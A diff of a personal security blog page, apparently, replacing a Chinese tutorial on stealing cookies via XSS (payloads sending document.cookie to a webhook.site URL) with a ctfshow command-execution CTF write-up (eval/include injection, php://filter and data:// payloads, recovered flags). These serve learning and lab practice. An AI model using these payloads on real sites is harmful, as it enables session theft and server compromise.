@@ -9,7 +9,7 @@
   
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
   <title>
-    xss外带cookie攻击 | Cl1ck-t0&#39;s blog
+    命令执行 | Cl1ck-t0&#39;s blog
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
@@ -17,19 +17,17 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="xss外带cookie攻击 写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。  一.概念 XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而窃取用户的 Cookie 信息。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并将受害者的 Cookie 数据上传到攻击者控制的服务器上，这">
+    <meta name="description" content="命令执行 ctfshow web入门篇  1.web29 1234567891011121314151617181920212223&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xss外带cookie攻击">
-<meta property="og:url" content="https://cl1ck-t0.github.io/2026/02/09/xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:title" content="命令执行">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/07/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
-<meta property="og:description" content="xss外带cookie攻击 写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。  一.概念 XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而窃取用户的 Cookie 信息。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并将受害者的 Cookie 数据上传到攻击者控制的服务器上，这">
+<meta property="og:description" content="命令执行 ctfshow web入门篇  1.web29 1234567891011121314151617181920212223&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2026-02-09T07:50:09.000Z">
-<meta property="article:modified_time" content="2026-02-24T11:58:03.449Z">
+<meta property="article:published_time" content="2026-07-21T02:01:34.000Z">
+<meta property="article:modified_time" content="2026-07-21T04:18:15.828Z">
 <meta property="article:author" content="Cl1ck-t0">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="web安全">
-<meta property="article:tag" content="xss外带">
 <meta name="twitter:card" content="summary">
     <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
     <link rel="shortcut icon" href="/images/favicon.ico">
@@ -123,11 +121,11 @@
 <header id="header" aria-label="Site header">
         <picture>
         </picture>
-          <img  fetchpriority="high" src="/images/banner.webp" alt="xss外带cookie攻击">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="命令执行">
   <div id="header-outer">
     <div id="header-title">
           <span id="logo">
-            <h1 data-aos="slide-up">xss外带cookie攻击</h1>
+            <h1 data-aos="slide-up">命令执行</h1>
           </span>
         <h2 id="subtitle-wrap" data-aos="slide-down">
         </h2>
@@ -158,7 +156,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text"> xss外带cookie攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text"> 一.概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.2.</span> <span class="toc-text"> 二.攻击姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fetch%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text"> fetch()方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#windowopen%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text"> window.open方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xhr%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.3.</span> <span class="toc-text"> XHR方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xmlhttprequest-%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.4.</span> <span class="toc-text"> XMLHttpRequest 对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#windowlocation-%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.5.</span> <span class="toc-text"> window.location 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#windowlocationhref"><span class="toc-number">1.2.5.1.</span> <span class="toc-text"> window.location.href</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#documentwrite%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.6.</span> <span class="toc-text"> document.write方法</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text"> 命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2web30"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3web38"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4web74"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -219,13 +217,13 @@
   </div>
 </aside>
 
-          <section id="main" aria-label="Main content"><article id="post-xss外带cookie攻击" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main" aria-label="Main content"><article id="post-命令执行" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
-    <time datetime="2026-02-09T07:50:09.000Z" itemprop="datePublished">2026-02-09</time>
-    <time style="display: none;" id="post-update-time">2026-02-24</time>
+    <time datetime="2026-07-21T02:01:34.000Z" itemprop="datePublished">2026-07-21</time>
+    <time style="display: none;" id="post-update-time">2026-07-21</time>
   </span>
 </div>
 
@@ -234,74 +232,66 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="xss外带cookie攻击"><a class="markdownIt-Anchor" href="#xss外带cookie攻击"></a> xss外带cookie攻击</h1>
-<p>写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。</p>
-<h2 id="一概念"><a class="markdownIt-Anchor" href="#一概念"></a> 一.概念</h2>
-<p>XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而<strong>窃取用户的 Cookie 信息</strong>。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并<strong>将受害者的 Cookie 数据上传到攻击者控制的服务器上</strong>，这就是xss外带cookie攻击的核心。</p>
-<h2 id="二攻击姿势"><a class="markdownIt-Anchor" href="#二攻击姿势"></a> 二.攻击姿势</h2>
-<p>xss外带cookie攻击姿势与xss基本无异，区别在于<strong>在使用XSS语句将Cookie外带到攻击者IP地址前，需要在攻击机上起一个http协议，使得目标机能够将Cookie发送给该IP地址</strong>。</p>
-<p>对此，我们小灯可以尝试使用一些CTF常用的Cookie接收平台：</p>
-<ol>
-<li><strong>RequestBin</strong> (<a target="_blank" rel="noopener" href="http://requestbin.com">requestbin.com</a>)</li>
-<li><strong>Webhook.site</strong> (webhook.site)</li>
-<li><strong>Beeceptor</strong> (<a target="_blank" rel="noopener" href="http://beeceptor.com">beeceptor.com</a>)</li>
-</ol>
-<p>个人常用2，也可使用云服务器来接收cookie或者python进行(可能需要内网穿透)。</p>
-<p>接下来以webhook的临时URL为例简单说明一下xss外带的攻击姿势：</p>
-<p>1.&lt;img 标签</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;document.write(&#x27;&lt;img src=https://webhook.site/9da61079-3b72-49a3-a304-def16d136edb/?c=&#x27;+document.cookie+&#x27;&gt;&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;window.open(&#x27;https://webhook.site/9da61079-3b72-49a3-a304-def16d136edb/?c=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>这里提一嘴：</p>
-<p>浏览器的跨域资源共享可能存在限制(CORS),所以有些时候xss外带对自己有效而对目标无效时可能是因为浏览器的安全策略可能阻止了向webhook.site发送数据，这时就要考虑隐蔽点的xss：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=this.src=&#x27;https://webhook.site/9da61079-3b72-49a3-a304-def16d136edb/?&#x27;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.src = &#x27;xxx&#x27;</span><br></pre></td></tr></table></figure>
-<p><code>this</code> 指向当前的 <code>&lt;img&gt;</code> 元素本身，</p>
-<p>直接修改这个图片元素的 <code>src</code> 属性，</p>
-<p><strong>这是一个赋值操作，不是新建请求</strong>，更不容易被CORS阻止。</p>
-<h4 id="fetch方法"><a class="markdownIt-Anchor" href="#fetch方法"></a> fetch()方法</h4>
-<p><code>fetch()</code> 允许 JavaScript 发送 HTTP 请求。如果 <code>credentials: 'include'</code>，则可以携带当前站点的 Cookie</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure>
-<h4 id="windowopen方法"><a class="markdownIt-Anchor" href="#windowopen方法"></a> window.open方法</h4>
-<p><code>window.open()</code> 是 JavaScript 中用于<strong>打开新窗口或新标签页</strong>的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象</p>
-<p>例如，以下代码将会在新窗口或新标签页中打开指定 URL：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);</span><br></pre></td></tr></table></figure>
-<h4 id="xhr方法"><a class="markdownIt-Anchor" href="#xhr方法"></a> XHR方法</h4>
-<p><code>XMLHttpRequest</code> 是浏览器提供的内建 JavaScript 对象，用于在<strong>不刷新页面的情况下与服务器进行 HTTP 通信</strong>。它是早期 AJAX 技术的核心</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.open(&quot;GET&quot;, &quot;//webhook.site/xxxxxxxx/?cookie=&quot; %2BencodeURIComponent(document.cookie), true);</span><br><span class="line">xhr.send();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="xmlhttprequest-对象"><a class="markdownIt-Anchor" href="#xmlhttprequest-对象"></a> <code>XMLHttpRequest</code> 对象</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;, &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie, true); xhr.send();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="windowlocation-对象"><a class="markdownIt-Anchor" href="#windowlocation-对象"></a> <code>window.location</code> 对象</h4>
-<p><code>window.location</code> 可以把浏览器重定向到新的页面，此时可通过url携带cookie；使用方法例如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location=&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>下面是<code>window.location</code> 对象中<strong>可用于跳转的方法</strong></p>
-<h5 id="windowlocationhref"><a class="markdownIt-Anchor" href="#windowlocationhref"></a> <code>window.location.href</code></h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href = &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;</span><br></pre></td></tr></table></figure>
-<p><code>window.location.assign(url)</code>、<code>window.location.replace(url)</code>同上</p>
-<h4 id="documentwrite方法"><a class="markdownIt-Anchor" href="#documentwrite方法"></a> <code>document.write</code>方法</h4>
-<p>利用 <code>document.write</code> 写入某些含有src属性的标签，并将Cookie拼接到目标URL中，作为参数发送到指定的 IP 地址和端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.write(`&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=$&#123;document.cookie&#125;&quot; &gt;`)</span><br><span class="line">document.write(&#x27;&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie+&#x27;&quot;/&gt;&#x27;)</span><br></pre></td></tr></table></figure>
+        <h1 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h1>
+<p>ctfshow web入门篇</p>
+<h2 id="1web29"><a class="markdownIt-Anchor" href="#1web29"></a> 1.web29</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>非常简单不多说直接上payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://e1c8a274-c9ed-4d9d-9efa-b8eb3e052baa.challenge.ctf.show/?c=system(&#x27;cat fl*&#x27;);</span><br></pre></td></tr></table></figure>
+<p><strong>ctfshow{de157d64-7dc2-4a01-af46-6582c7cbb94b}</strong></p>
+<h2 id="2web30"><a class="markdownIt-Anchor" href="#2web30"></a> 2.web30</h2>
+<p>和29差不多</p>
+<p>采用include和php伪协议</p>
+<p>由于过滤检查的是c参数，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">    eval($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们构造c参数的值就可以绕过过滤:</p>
+<p>c=include&quot;$_GET[url]&quot;?&gt;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//f0f5cf03-da5d-4bf8-8537-bc24cbf8a1d2.challenge.ctf.show/?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDoxNDowNw0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6MTQ6MTcNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWcgPSAnY3Rmc2hvd3tkMzViODM5OC1hOGNjLTQyNzItYWE3Yy1hNjZjZDFlY2FmOGJ9JzsNCg==</span><br></pre></td></tr></table></figure>
+<p>得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;d35b8398-a8cc-4272-aa7c-a66cd1ecaf8b&#125;</span><br></pre></td></tr></table></figure>
+<p>当然也可以避开system，直接使用echo</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `cat f*`;</span><br></pre></td></tr></table></figure>
+<p>文件写入也可以，只是我个人不怎么用（）</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=echo`cat ????.??? &gt;&gt; 1.txt`;</span><br></pre></td></tr></table></figure>
+<h2 id="3web38"><a class="markdownIt-Anchor" href="#3web38"></a> 3.web38</h2>
+<p>data</p>
+<p>感觉都差不多随手挑几个做，后面直接跳到最后几题看看就行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\# -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Date</span>:  2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified by:  h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified time: 2020-09-04 05:23:36</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>}</p>
+<p>}else{<br />
+highlight_file(<strong>FILE</strong>);<br />
+}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>
+<p><strong>ctfshow{f530af8d-3c5f-4b77-ace8-f62bb8c70aa8}</strong></p>
+<h2 id="4web74"><a class="markdownIt-Anchor" href="#4web74"></a> 4.web74</h2>
+<p>不是哥们随便挑一题环境坏了QAQ😡😭</p>
+<p>ps：我就说为什么后面这几题账号那么久没人做，原来是都坏了（）</p>
+<p>后续有遇到新题再补充吧emmmmmm</p>
 
     </div>
     <footer class="article-footer">
         <blockquote class="article-copyright">
     <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
-    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/02/09/xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB/">https://cl1ck-t0.github.io/2026/02/09/xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB/</a></p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/07/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://cl1ck-t0.github.io/2026/07/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></p>
     
-    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-02-09 15:50:09</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-02-24 19:58:03</p>
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-07-21 10:01:34</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-07-21 12:18:15</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
         <div class="share-wrapper">
-    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F02%2F09%2Fxss%25E5%25A4%2596%25E5%25B8%25A6cookie%25E6%2594%25BB%25E5%2587%25BB%2F&amp;appkey=&amp;title=xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="xss外带cookie攻击">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F07%2F21%2F%25E5%2591%25BD%25E4%25BB%25A4%25E6%2589%25A7%25E8%25A1%258C%2F&amp;appkey=&amp;title=%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="命令执行">
       <div class="share-icon icon icon-weibo">
       </div>
     </a>
-    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB&amp;desc=xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="xss外带cookie攻击">
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;desc=%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="命令执行">
       <div class="share-icon icon icon-qq">
       </div>
     </a>
-    <a href="javascript:;"  title="xss外带cookie攻击">
+    <a href="javascript:;"  title="命令执行">
       <div class="share-icon icon icon-weixin">
           <div id="share-weixin">
             <div class="share-weixin-dom">
@@ -324,25 +314,17 @@
     </a>
 </div>
       
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag" title="web安全">web安全</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/xss%E5%A4%96%E5%B8%A6/" rel="tag" title="xss外带">xss外带</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li></ul>
 
     </footer>
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
-      <div class="article-nav-link-wrap left">
-            <img data-src="/covers/3032b6252fa98175d8d46be9a6cdda6e.jpg" data-sizes="auto" alt="phpstuty的配置和使用(自用)" class="lazyload">
-        <a href="/2026/02/10/phpstuty%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8-%E8%87%AA%E7%94%A8/" aria-label="Prev: phpstuty的配置和使用(自用)" title="Prev: phpstuty的配置和使用(自用)"></a>
-        <div class="article-nav-caption">Prev</div>
-        <h3 class="article-nav-title">
-            phpstuty的配置和使用(自用)
-        </h3>
-      </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/acheron-honkai-star-3840x2160-19696.jpg" data-sizes="auto" alt="PHP反序列化漏洞" class="lazyload">
-      <a href="/2026/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" aria-label="Next: PHP反序列化漏洞"  title="Next: PHP反序列化漏洞"></a>
